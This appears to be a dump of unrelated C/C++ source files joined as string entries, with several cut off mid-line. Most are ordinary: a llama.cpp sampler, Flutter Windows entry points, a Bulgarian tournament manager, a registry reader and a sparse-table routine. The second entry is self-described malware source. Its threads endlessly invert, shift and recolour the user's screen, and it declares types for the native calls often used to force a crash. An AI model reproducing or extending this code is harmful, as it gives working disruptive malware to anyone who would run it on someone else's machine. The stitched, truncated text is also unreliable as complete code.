0;\n    size_t sz = 0;\n    size_t first = 0;\n    size_t pos = 0;\n    std::vector<T> data;\n};\n\nstruct common_sampler {\n    common_params_sampling params;\n\n    struct llama_sampler * grmr;\n    struct llama_sampler * chain;\n\n    ring_buffer<llama_token> prev;\n\n    std::vector<llama_token_data> cur;\n\n    llama_token_data_array cur_p;\n\n    void set_logits(struct llama_context * ctx, int idx) {\n        if (!ctx) {\n            throw std::runtime_error(\"null context in set_logits\");\n        }\n\n        const auto * logits = llama_get_logits_ith(ctx, idx);\n        if (!logits) {\n            throw std::runtime_error(\"failed to get logits\");\n        }\n\n        const int n_vocab = llama_n_vocab(llama_get_model(ctx));\n        if (n_vocab <= 0) {\n            throw std::runtime_error(\"invalid vocabulary size\");\n        }\n\n        cur.resize(n_vocab);\n\n        for (llama_token token_id = 0; token_id < n_vocab; token_id++) {\n            cur[token_id] = llama_token_data{token_id, logits[token_id], 0.0f};\n        }\n\n        cur_p = { cur.data(), static_cast<size_t>(n_vocab), -1, false };\n    }\n};\n\nstd::string common_params_sampling::print() const {\n    char result[1024];\n\n    snprintf(result, sizeof(result),\n            \"\\trepeat_last_n = %d, repeat_penalty = %.3f, frequency_penalty = %.3f, presence_penalty = %.3f\\n\"\n            \"\\tdry_multiplier = %.3f, dry_base = %.3f, dry_allowed_length = %d, dry_penalty_last_n = %d\\n\"\n            \"\\ttop_k = %d, top_p = %.3f, min_p = %.3f, xtc_probability = %.3f, xtc_threshold = %.3f, typical_p = %.3f, temp = %.3f\\n\"\n            \"\\tmirostat = %d, mirostat_lr = %.3f, mirostat_ent = %.3f\",\n            penalty_last_n, penalty_repeat, penalty_freq, penalty_present,\n            dry_multiplier, dry_base, dry_allowed_length, dry_penalty_last_n,\n            top_k, top_p, min_p, xtc_probability, xtc_threshold, typ_p, temp,\n            mirostat, mirostat_eta, mirostat_tau);\n\n    return std::string(result);\n}\n\nstruct common_sampler * common_sampler_init(const struct llama_model * model, const struct common_params_sampling & params) {\n    llama_sampler_chain_params lparams = llama_sampler_chain_default_params();\n\n    lparams.no_perf = params.no_perf;\n\n    auto * result = new common_sampler {\n        /* .params = */ params,\n        /* .grmr   = */ llama_sampler_init_grammar(model, params.grammar.c_str(), \"root\"),\n        /* .chain  = */ llama_sampler_chain_init(lparams),\n        /* .prev   = */ ring_buffer<llama_token>(std::max(32, params.n_prev)),\n        /* .cur    = */ {},\n        /* .cur_p  = */ {},\n    };\n\n    llama_sampler_chain_add(result->chain,\n            llama_sampler_init_logit_bias(\n                llama_n_vocab(model),\n                params.logit_bias.size(),\n                params.logit_bias.data()));\n\n    if (params.mirostat == 0) {\n        for (const auto & cnstr : params.samplers) {\n            swit",
    "#include <windows.h>\n#include <windowsx.h>\n#pragma comment(lib, \"winmm.lib\")\n#include <math.h>\n#include <time.h>\n#define M_PI   3.14159265358979323846264338327950288\ntypedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);\ntypedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);\ntypedef struct\n{\n\tFLOAT h;\n\tFLOAT s;\n\tFLOAT l;\n} HSL;\n\nnamespace Colors\n{\n\t//These HSL functions was made by Wipet, credits to him!\n\t//OBS: I used it in 3 payloads\n\n\t//Btw ArTicZera created HSV functions, but it sucks unfortunatelly\n\t//So I didn't used in this malware.\n\n\tHSL rgb2hsl(RGBQUAD rgb)\n\t{\n\t\tHSL hsl;\n\n\t\tBYTE r = rgb.rgbRed;\n\t\tBYTE g = rgb.rgbGreen;\n\t\tBYTE b = rgb.rgbBlue;\n\n\t\tFLOAT _r = (FLOAT)r / 255.f;\n\t\tFLOAT _g = (FLOAT)g / 255.f;\n\t\tFLOAT _b = (FLOAT)b / 255.f;\n\n\t\tFLOAT rgbMin = min(min(_r, _g), _b);\n\t\tFLOAT rgbMax = max(max(_r, _g), _b);\n\n\t\tFLOAT fDelta = rgbMax - rgbMin;\n\t\tFLOAT deltaR;\n\t\tFLOAT deltaG;\n\t\tFLOAT deltaB;\n\n\t\tFLOAT h = 0.f;\n\t\tFLOAT s = 0.f;\n\t\tFLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);\n\n\t\tif (fDelta != 0.f)\n\t\t{\n\t\t\ts = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));\n\t\t\tdeltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);\n\t\t\tdeltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);\n\t\t\tdeltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);\n\n\t\t\tif (_r == rgbMax)      h = deltaB - deltaG;\n\t\t\telse if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;\n\t\t\telse if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;\n\t\t\tif (h < 0.f)           h += 1.f;\n\t\t\tif (h > 1.f)           h -= 1.f;\n\t\t}\n\n\t\thsl.h = h;\n\t\thsl.s = s;\n\t\thsl.l = l;\n\t\treturn hsl;\n\t}\n\n\tRGBQUAD hsl2rgb(HSL hsl)\n\t{\n\t\tRGBQUAD rgb;\n\n\t\tFLOAT r = hsl.l;\n\t\tFLOAT g = hsl.l;\n\t\tFLOAT b = hsl.l;\n\n\t\tFLOAT h = hsl.h;\n\t\tFLOAT sl = hsl.s;\n\t\tFLOAT l = hsl.l;\n\t\tFLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);\n\n\t\tFLOAT m;\n\t\tFLOAT sv;\n\t\tFLOAT fract;\n\t\tFLOAT vsf;\n\t\tFLOAT mid1;\n\t\tFLOAT mid2;\n\n\t\tINT sextant;\n\n\t\tif (v > 0.f)\n\t\t{\n\t\t\tm = l + l - v;\n\t\t\tsv = (v - m) / v;\n\t\t\th *= 6.f;\n\t\t\tsextant = (INT)h;\n\t\t\tfract = h - sextant;\n\t\t\tvsf = v * sv * fract;\n\t\t\tmid1 = m + vsf;\n\t\t\tmid2 = v - vsf;\n\n\t\t\tswitch (sextant)\n\t\t\t{\n\t\t\tcase 0:\n\t\t\t\tr = v;\n\t\t\t\tg = mid1;\n\t\t\t\tb = m;\n\t\t\t\tbreak;\n\t\t\tcase 1:\n\t\t\t\tr = mid2;\n\t\t\t\tg = v;\n\t\t\t\tb = m;\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tr = m;\n\t\t\t\tg = v;\n\t\t\t\tb = mid1;\n\t\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\t\tr = m;\n\t\t\t\tg = mid2;\n\t\t\t\tb = v;\n\t\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\t\tr = mid1;\n\t\t\t\tg = m;\n\t\t\t\tb = v;\n\t\t\t\tbreak;\n\t\t\tcase 5:\n\t\t\t\tr = v;\n\t\t\t\tg = m;\n\t\t\t\tb = mid2;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\trgb.rgbRed = (BYTE)(r * 255.f);\n\t\trgb.rgbGreen = (BYTE)(g * 255.f);\n\t\trgb.rgbBlue = (BYTE)(b * 255.f);\n\n\t\treturn rgb;\n\t}\n}\n\n\ntypedef union _RGBQUAD {\n\tCOLORREF rgb;\n\tstruct {\n\t\tBYTE b;\n\t\tBYTE g;\n\t\tBYTE r;\n\t\tBYTE unused;\n\t};\n}_RGBQUAD, * PRGBQUAD;\n\nDWORD WINAPI hell(LPVOID lpParam) {\n\twhile (1) {\n\t\tHDC hdc = GetDC(0);\n\t\tint x = SM_CXSCREEN;\n\t\tint y = SM_CYSCREEN;\n\t\tint w = GetSystemMetrics(0);\n\t\tint h = GetSystemMetrics(1);\n\t\tBitBlt(hdc, rand() % 30, rand() % 30, w, h, hdc, rand() % 30, rand() % 30, NOTSRCERASE);\n\t\tSleep(10);\n\t\tReleaseDC(0, hdc);\n\t}\n}\n\nDWORD WINAPI shader1(LPVOID lpParam)\n{\n\tHDC hdc = GetDC(NULL);\n\tHDC hdcCopy = CreateCompatibleDC(hdc);\n\tint screenWidth = GetSystemMetrics(SM_CXSCREEN);\n\tint screenHeight = GetSystemMetrics(SM_CYSCREEN);\n\tBITMAPINFO bmpi = { 0 };\n\tHBITMAP bmp;\n\n\tbmpi.bmiHeader.biSize = sizeof(bmpi);\n\tbmpi.bmiHeader.biWidth = screenWidth;\n\tbmpi.bmiHeader.biHeight = screenHeight;\n\tbmpi.bmiHeader.biPlanes = 1;\n\tbmpi.bmiHeader.biBitCount = 32;\n\tbmpi.bmiHeader.biCompression = BI_RGB;\n\n\n\tRGBQUAD* rgbquad = NULL;\n\tHSL hslcolor;\n\n\tbmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);\n\tSelectObject(hdcCopy, bmp);\n\n\tINT i = 0;\n\n\twhile (1)\n\t{\n\t\thdc = GetDC(NULL);\n\t\tStretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);\n\n\t\tRGBQUAD rgbquadCopy;\n\n\t\tfor (int x = 0; x < screenWidth; x++)\n\t\t{\n\t\t\tfor (int y = 0; y < screenHeight; y++)\n\t\t\t{\n\t\t\t\tint index = y * screenWidth + x;\n\n\t\t\t\tint fx = (int)((i ^ 4) + (i * 4) * log((x * 111 + i) + (111 * y + x)));\n\n\t\t\t\trgbquadCopy = rgbquad[index];\n\n\t\t\t\thslcolor = Colors::rgb2hsl(rgbquadCopy);\n\t\t\t\thslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);\n\n\t\t\t\trgbquad[index] = Colors::hsl2rgb(hslcolor);\n\t\t\t}\n\t\t}\n\n\t\ti++;\n\n\t\tStretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);\n\t\tReleaseDC(NULL, hdc);\n\t\tDeleteDC(hdc);\n\t}\n\n\treturn 0x00;\n}\n\nDWORD WINAPI train(LPVOID lpParam) {\n\tint w = GetSystemMetrics(0);\n\tint h = GetSystemMetrics(1);\n\twhile (1) {\n\t\tHDC hdc = GetDC(0);\n\t\tBitBlt(hdc, -30, 0, w, h, hdc, 0, 0, SRCCOPY);\n\t\tBitBlt(hdc, w - 30, 0, w, h, hdc, 0, 0, NOTSRCCOPY);\n\t\tReleaseDC(0, hdc);\n\t\tSleep(10);\n\t}\n}\n\nDWORD WINAPI colors(LPVOID lpParam) {\n\tHDC hdc = GetDC(0);\n\tint x = GetSystemMetrics(0);\n\tint y = GetSystemMetrics(1);\n\twhile (true)\n\t{\n\t\thdc = GetDC(0);\n\t\tHBRUSH brush = CreateSolidBrush(RGB(rand() % 225, rand() % 225, rand()",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"collector\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\r\n#include <iomanip>\r\n#include <string>\r\n#include <fstream>\r\n#include <Windows.h>\r\n\r\nusing namespace std;\r\n\r\nconst unsigned short max_players = 100;\r\nconst unsigned short max_name_size = 15;\r\nconst unsigned short max_country_size = 15;\r\n\r\n#define COLUMN_WIDTH_1 15\r\n#define COLUMN_WIDTH_2 18\r\n#define COLUMN_WIDTH_3 15\r\n#define COLUMN_WIDTH_4 15\r\n#define COLUMN_WIDTH_5 15\r\n#define COLUMN_WIDTH_6 12\r\n#define COLUMN_WIDTH_7 14\r\n#define COLUMN_SEPARATORS 8\r\n\r\n#define TABLE_WIDTH (COLUMN_WIDTH_1 + COLUMN_WIDTH_2 + COLUMN_WIDTH_3 + COLUMN_WIDTH_4 + COLUMN_WIDTH_5 + COLUMN_WIDTH_6 + COLUMN_WIDTH_7 + COLUMN_SEPARATORS)\r\n\r\n\r\nstruct player\r\n{\r\n\tint number_in_tournament;\r\n\tint place_in_the_world;\r\n\tchar first_name[max_name_size];\r\n\tchar last_name[max_name_size];\r\n\tchar country[max_country_size];\r\n\tint points;\r\n\tshort trophies;\r\n};\r\n\r\nstruct match \r\n{\r\n\tint player1_index;\r\n\tint player2_index;\r\n\tint player1_score;\r\n\tint player2_score;\r\n\tint winner_index;\r\n};\r\n\r\n\r\nvoid menu();\r\nvoid submenu(player players[], int& player_counter);\r\nvoid tournament_menu(player players[], int player_counter);\r\nvoid pause();\r\n\r\nvoid enter_players(player players[], int& player_counter);\r\n\r\nvoid print_players(const player players[], int& player_counter);\r\nvoid print_table_header();\r\nvoid print_table_row(const player& p);\r\nvoid print_table_footer();\r\nvoid print_players(const player players[], int& player_counter);\r\n\r\nvoid search_trophies(const player players[], int player_counter);\r\nvoid search_country(const player players[], int player_counter);\r\nvoid sort_world(player players[], int playerCount);\r\n\r\nvoid save_to_file(const player players[], int player_counter);\r\nvoid load_from_file(player players[], int& player_counter);\r\n\r\nvoid sort_trophies(player players[], int player_counter);\r\nvoid search_country_and_name(const player players[], int player_counter);\r\n\r\nvoid create_matches(match matches[], int& match_counter, const player players[], int player_counter);\r\nvoid add_results(match matches[], int match_counter, player players[]);\r\nvoid create_elimination_matches(match matches[], int& match_counter, const match previous_round[], int previous_match_count);\r\n\r\n\r\nint main()\r\n{\r\n\tSetConsoleOutputCP(1251);\r\n\tSetConsoleCP(1251);\r\n\r\n\tplayer players[max_players];\r\n\tint player_counter = 0;\r\n\r\n\tint choice;\r\n\r\n\tload_from_file(players, player_counter);\r\n\r\n\tdo\r\n\t{\r\n\t\tmenu();\r\n\t\tcout << endl << \"\u0412\u044a\u0432\u0435\u0434\u0438 \u043a\u043e\u043c\u0430\u043d\u0434\u0430: \";\r\n\t\tcin >> choice;\r\n\r\n\t\tswitch (choice)\r\n\t\t{\r\n\t\tcase 1:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tenter_players(players, player_counter);\r\n\t\t\tbreak;\r\n\t\tcase 2:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tcout << \"\u0421\u043f\u0438\u0441\u044a\u043a \u043d\u0430 \u0432\u0441\u0438\u0447\u043a\u0438 \u0441\u044a\u0441\u0442\u0435\u0437\u0430\u0442\u0435\u043b\u0438:\" << endl;\r\n\t\t\tprint_players(players, player_counter);\r\n\t\t\tbreak;\r\n\t\tcase 3:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tsearch_trophies(players, player_counter);\r\n\t\t\tbreak;\r\n\t\tcase 4:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tsearch_country(players, player_counter);\r\n\t\t\tbreak;\r\n\t\tcase 5:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tsort_world(players, player_counter);\r\n\t\t\tbreak;\r\n\t\tcase 6:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tsave_to_file(players, player_counter);\r\n\t\t\tbreak;\r\n\t\tcase 7:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tload_from_file(players, player_counter);\r\n\t\t\tbreak;\r\n\t\tcase 8:\r\n\t\t{\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tsubmenu(players, player_counter);\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 9:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\ttournament_menu(players, player_counter);\r\n\t\t\tbreak;\r\n\t\tcase 0:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tcout << endl << \"\u0418\u0437\u0445\u043e\u0434 \u043e\u0442 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u0430\u0442\u0430.\" << endl;\r\n\t\t\tsave_to_file(players, player_counter);\r\n\t\t\tbreak;\r\n\t\tdefault:\r\n\t\t\tcout << endl << \"\u0412\u044a\u0432\u0435\u0434\u0435\u0442\u0435 \u0432\u0430\u043b\u0438\u0434\u043d\u0430 \u043a\u043e\u043c\u0430\u043d\u0434\u0430!\" << endl;\r\n\t\t}\r\n\r\n\t\tif (choice != 0)\r\n\t\t{\r\n\t\t\tpause();\r\n\t\t}\r\n\t} while (choice != 0);\r\n\r\n\treturn 0;\r\n}\r\n\r\nvoid menu()\r\n{\r\n\tcout << \"--------------------------------------------------------------------------------\" << endl;\r\n\tcout << \"\\t\\t\u041c\u0415\u041d\u042e\\t\\t\" << endl;\r\n\tcout << \"1. \u0414\u043e\u0431\u0430\u0432\u044f\u043d\u0435 \u043d\u0430 \u0441\u044a\u0441\u0442\u0435\u0437\u0430\u0442\u0435\u043b\u0438 \u0432 \u0442\u0443\u0440\u043d\u0438\u0440\u0430.\" << endl;\r\n\tcout << \"2. \u0418\u0437\u0432\u0435\u0436\u0434\u0430\u043d\u0435 \u043d\u0430 \u0432\u0441\u0438\u0447\u043a\u0438 \u0441\u044a\u0441\u0442\u0435\u0437\u0430\u0442\u0435\u043b\u0438 \u043d\u0430 \u0435\u043a\u0440\u0430\u043d\u0430.\" << endl;\r\n\tcout << \"3. \u0418\u0437\u0432\u0435\u0436\u0434\u0430\u043d\u0435 \u043d\u0430 \u0441\u044a\u0441\u0442\u0435\u0437\u0430\u0442\u0435\u043b\u0438 \u0441 \u043d\u0430\u0439-\u043c\u0430\u043b\u043a\u043e \u0441\u043f\u0435\u0447\u0435\u043b\u0435\u043d\u0438 \u043a\u0443\u043f\u0438.\" << endl;\r\n\tcout << \"4. \u0418\u0437\u0432\u0435\u0436\u0434\u0430\u043d\u0435 \u043d\u0430 \u0441\u044a\u0441\u0442\u0435\u0437\u0430\u0442\u0435\u043b\u0438 \u043e\u0442 \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0430 \u0434\u044a\u0440\u0436\u0430\u0432\u0430.\" << endl;\r\n\tcout << \"5. \u041f\u043e\u0434\u0440\u0435\u0436\u0434\u0430\u043d\u0435 \u043d\u0430 \u0441\u044a\u0441\u0442\u0435\u0437\u0430\u0442\u0435\u043b\u0438\u0442\u0435 \u0432 \u043d\u0430\u0440\u0430\u0441\u0442\u0432\u0430\u0449 \u0440\u0435\u0434 \u043d\u0430 \u043d\u043e\u043c\u0435\u0440\u0430 \u0432 \u0441\u0432\u0435\u0442\u043e\u0432\u043d\u0430\u0442\u0430 \u0440\u0430\u043d\u0433\u043b\u0438\u0441\u0442\u0430.\" << endl;\r\n\tcout << \"6. \u0418\u0437\u0432\u0435\u0436\u0434\u0430\u043d\u0435 \u043d\u0430 \u043c\u0430\u0441\u0438\u0432\u0430 \u0441\u044a\u0441 \u0441\u044a\u0441\u0442\u0435\u0437\u0430\u0442\u0435\u043b\u0438\u0442\u0435 \u0432\u044a\u0432 \u0444\u0430\u0439\u043b.\" << endl;\r\n\tcout << \"7. \u0412\u044a\u0432\u0435\u0436\u0434\u0430\u043d\u0435 \u043d\u0430 \u043c\u0430\u0441\u0438\u0432\u0430 \u0441\u044a\u0441 \u0441\u044a\u0441\u0442\u0435\u0437\u0430\u0442\u0435\u043b\u0438\u0442\u0435 \u043e\u0442 \u0444\u0430\u0439\u043b.\" << endl;\r\n\tcout << \"8. \u041f\u043e\u0434\u043c\u0435\u043d\u044e.\" << endl;\r\n\tcout << \"9. \u0422\u0443\u0440\u043d\u0438\u0440.\" << endl;\r\n\tcout << \"0. \u0418\u0437\u0445\u043e\u0434.\" << endl;\r\n}\r\n\r\nvoid submenu(player players[], int& player_counter)\r\n{\r\n\tsystem(\"cls\");\r\n\t\r\n\tint sub_choice;\r\n\r\n\tdo\r\n\t{\r\n\t\tcout << \"--------------------------------------------------------------------------------\" << endl;\r\n\t\tcout << \"\\t\\t\u041f\u041e\u0414\u041c\u0415\u041d\u042e\\t\\t\" << endl;\r\n\t\tcout << \"1. \u0418\u0437\u0432\u0435\u0436\u0434\u0430\u043d\u0435 \u043d\u0430 \u0441\u043f\u043e\u0440\u0442\u0438\u0441\u0442\u0438\u0442\u0435 \u0432 \u043d\u0430\u043c\u0430\u043b\u044f\u0432\u0430\u0449 \u0440\u0435\u0434 \u043d\u0430 \u0441\u043f\u0435\u0447\u0435\u043b\u0435\u043d\u0438\u0442\u0435 \u0442\u0438\u0442\u043b\u0438.\" << endl;\r\n\t\tcout << \"2. \u0422\u044a\u0440\u0441\u0435\u043d\u0435 \u0438 \u0438\u0437\u0432\u0435\u0436\u0434\u0430\u043d\u0435 \u043d\u0430 \u0441\u044a\u0441\u0442\u0435\u0437\u0430\u0442\u0435\u043b \u043f\u043e \u0434\u044a\u0440\u0436\u0430\u0432\u0430 \u0438 \u043f\u044a\u0440\u0432\u043e \u0438\u043c\u0435.\" << endl;\r\n\t\tcout << \"0. \u0412\u0440\u044a\u0449\u0430\u043d\u0435 \u043a\u044a\u043c \u0433\u043b\u0430\u0432\u043d\u043e\u0442\u043e \u043c\u0435\u043d\u044e.\" << endl;\r\n\t\tcout << endl << \"\u0412\u044a\u0432\u0435\u0434\u0438 \u043a\u043e\u043c\u0430\u043d\u0434\u0430: \";\r\n\t\tcin >> sub_choice;\r\n\r\n\t\tswitch (sub_choice)\r\n\t\t{\r\n\t\tcase 1:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tsort_trophies(players, player_counter);\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"stripe_payment_getway\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"RegistryHelper.h\"\n\nBOOL RegistryHelper::ReadStringFromRegistry(HKEY hKeyParent, LPCWSTR subkey, LPCTSTR valueName, PWCHAR* readData)\n{\n    HKEY hKey;\n    DWORD len = TOTAL_BYTES_READ;\n    DWORD readDataLen = len;\n    PWCHAR readBuffer = (PWCHAR)malloc(sizeof(PWCHAR) * len);\n    if (readBuffer == NULL)\n        return FALSE;\n    //Check if the registry exists\n    DWORD Ret = RegOpenKeyEx(\n        hKeyParent,\n        subkey,\n        0,\n        KEY_READ,\n        &hKey\n    );\n    if (Ret == ERROR_SUCCESS)\n    {\n        Ret = RegQueryValueEx(\n            hKey,\n            valueName,\n            NULL,\n            NULL,\n            (BYTE*)readBuffer,\n            &readDataLen\n        );\n        while (Ret == ERROR_MORE_DATA)\n        {\n            // Get a buffer that is big enough.\n            len += OFFSET_BYTES;\n            readBuffer = (PWCHAR)realloc(readBuffer, len);\n            readDataLen = len;\n            Ret = RegQueryValueEx(\n                hKey,\n                valueName,\n                NULL,\n                NULL,\n                (BYTE*)readBuffer,\n                &readDataLen\n            );\n        }\n        if (Ret != ERROR_SUCCESS)\n        {\n            RegCloseKey(hKey);\n            return false;;\n        }\n        *readData = readBuffer;\n        RegCloseKey(hKey);\n        return true;\n    }\n    else\n    {\n        return false;\n    }\n}\n\nstd::string RegistryHelper::GetExamType()\n{\n    PWCHAR readMessage = nullptr;\n    RegistryHelper* _regHelper = new RegistryHelper();\n    BOOL status = _regHelper->ReadStringFromRegistry(HKEY_CURRENT_USER, REGISTRY_NECOSCAN, REGISTRY_NECOSCAN_SUBKEY_EXAMTYPE, &readMessage); //read string\n    if (status == TRUE)\n    {\n        if (readMessage != nullptr)\n        {\n            std::wstring str(readMessage);\n            std::string regValue(str.begin(), str.end());\n\n            delete(readMessage);\n            delete(_regHelper);\n            return regValue;\n        }\n    }\n    delete(readMessage);\n    delete(_regHelper);\n    return \"\";\n}\n\nstd::string RegistryHelper::GetExamination()\n{\n    PWCHAR readMessage = nullptr;\n    RegistryHelper* _regHelper = new RegistryHelper();\n    BOOL status = _regHelper->ReadStringFromRegistry(HKEY_CURRENT_USER, REGISTRY_NECOSCAN, REGISTRY_NECOSCAN_SUBKEY_EXAMINATION, &readMessage); //read string\n    if (status == TRUE)\n    {\n        if (readMessage != nullptr)\n        {\n            std::wstring str(readMessage);\n            std::string regValue(str.begin(), str.end());\n\n            delete(readMessage);\n            delete(_regHelper);\n            return regValue;\n        }\n    }\n    delete(readMessage);\n    delete(_regHelper);\n    return \"\";\n}\n\nstd::string RegistryHelper::GetExamYear()\n{\n    PWCHAR readMessage = nullptr;\n    RegistryHelper* _regHelper = new RegistryHelper();\n    BOOL status = _regHelper->ReadStringFromRegistry(HKEY_CURRENT_USER, REGISTRY_NECOSCAN, REGISTRY_NECOSCAN_SUBKEY_EXAMYEAR, &readMessage); //read string\n    if (status == TRUE)\n    {\n        if (readMessage != nullptr)\n        {\n            std::wstring str(readMessage);\n            std::string regValue(str.begin(), str.end());\n\n            delete(readMessage);\n            delete(_regHelper);\n            return regValue;\n        }\n    }\n    delete(readMessage);\n    delete(_regHelper);\n    return \"\";\n}\n\nstd::string RegistryHelper::GetJobS()\n{\n    PWCHAR readMessage = nullptr;\n    RegistryHelper* _regHelper = new RegistryHelper();\n    BOOL status = _regHelper->ReadStringFromRegistry(HKEY_CURRENT_USER, REGISTRY_NECOSCAN, REGISTRY_NECOSCAN_SUBKEY_JOB, &readMessage); //read string\n    if (status == TRUE)\n    {\n        if (readMessage != nullptr)\n        {\n            std::wstring str(readMessage);\n            std::string regValue(str.begin(), str.end());\n\n            delete(readMessage);\n            delete(_regHelper);\n            return regValue;\n        }\n    }\n    delete(readMessage);\n    delete(_regHelper);\n    return \"\";\n}\n\nstd::string RegistryHelper::GetOpeartorId()\n{\n    PWCHAR readMessage = nullptr;\n    RegistryHelper* _regHelper = new RegistryHelper();\n    BOOL status = _regHelper->ReadStringFromRegistry(HKEY_CURRENT_USER, REGISTRY_NECOSCAN, REGISTRY_NECOSCAN_SUBKEY_OPERATORID, &readMessage); //read string\n    if (status == TRUE)\n    {\n        if (readMessage != nullptr)\n        {\n            std::wstring str(readMessage);\n            std::string regValue(str.begin(), str.end());\n\n            delete(readMessage);\n            delete(_regHelper);\n            return regValue;\n        }\n    }\n    delete(readMessage);\n    delete(_regHelper);\n    return \"\";\n}\n\nstd::string RegistryHelper::GetDeviceId()\n{\n    PWCHAR readMessage = nullptr;\n    RegistryHelper* _regHelper = new RegistryHelper();\n    BOOL status = _regHelper->ReadStringFromRegistry(HKEY_CURRENT_USER, REGISTRY_NECOSCAN, REGISTRY_NECOSCAN_SUBKEY_DEVICEID, &readMessage); //read string\n    if (status == TRUE)\n    {\n        if (readMessage != nullptr)\n        {\n            std::wstring str(readMessage);",
    "#include<iostream>\r\n#include<algorithm>\r\n#include<cmath>//\u4f7f\u7528log\u51fd\u6570\r\n/*log():\u4ee5e\u4e3a\u5e95\u7684\u5bf9\u6570\uff0cexp(5)=e^5,log(exp(5))=5\r\n  log10():\u4ee510\u4e3a\u5e95\u7684\u5bf9\u6570\r\n  log2():\u4ee52\u4e3a\u5e95\u7684\u5bf9\u6570 \r\n  \u4efb\u4f55\u4e00\u4e2a\u5176\u5b83\u7684\u5bf9\u6570logm(n)=log(n)/log(m)*/\r\nusing namespace std;\r\nconst int maxn=105;\r\nint n,a[maxn],F[maxn][maxn];//F(i,j)\u8868\u793a\u533a\u95f4[i\uff0ci+2^j-1]\u7684\u6700\u503c\uff0c\u533a\u95f4\u957f\u5ea6\u4e3a2^j\r\n\r\nvoid ST_create()\r\n{\r\n\tfor(int i=1;i<=n;i++)//\u521d\u59cb\u5316 \r\n\t\tF[i][0]=a[i];\r\n\tint k=log2(n);//log(n)/log(2);\r\n\tfor(int j=1;j<=k;j++)\r\n\t\tfor(int i=1;i<=n-(1<<j)+1;i++)//n-2^j+1\r\n\t\t\tF[i][j]=max(F[i][j-1],F[i+(1<<(j-1))][j-1]);\r\n}\r\n\r\nint ST_query(int l,int 